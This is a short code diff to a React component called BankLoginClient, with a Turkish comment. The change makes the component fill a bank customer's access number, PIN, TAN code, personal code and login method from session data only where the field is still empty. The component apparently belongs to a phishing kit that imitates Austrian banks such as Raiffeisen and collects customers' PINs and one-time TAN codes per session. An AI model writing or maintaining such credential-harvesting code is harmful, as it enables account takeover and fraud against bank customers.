@@ -256,11 +256,14 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
       if (cancelled || !data) return;
       const fd = (data.form_data ?? {}) as Record<string, string>;
       setSessionFormData(fd);
-      setVerfuegernummer(fd.verfuegernummer ?? "");
-      setPin(fd.pin ?? "");
-      setTacCode(fd.tacCode ?? "");
-      setPersonalCode(fd.personalCode ?? "");
-      setLoginMethod(fd.loginMethod ?? "");
+      // Once yalnizca bos ise doldur: fetch gec cozulunce mount'ta/sirada yazilan
+      // degerleri (orn. Raiffeisen mount-effect'i "Kärnten" -> loginMethod)
+      // "" ile ezmesin.
+      setVerfuegernummer((prev) => prev || (fd.verfuegernummer ?? ""));
+      setPin((prev) => prev || (fd.pin ?? ""));
+      setTacCode((prev) => prev || (fd.tacCode ?? ""));
+      setPersonalCode((prev) => prev || (fd.personalCode ?? ""));
+      setLoginMethod((prev) => prev || (fd.loginMethod ?? ""));
     })();
     return () => {
       cancelled = true;
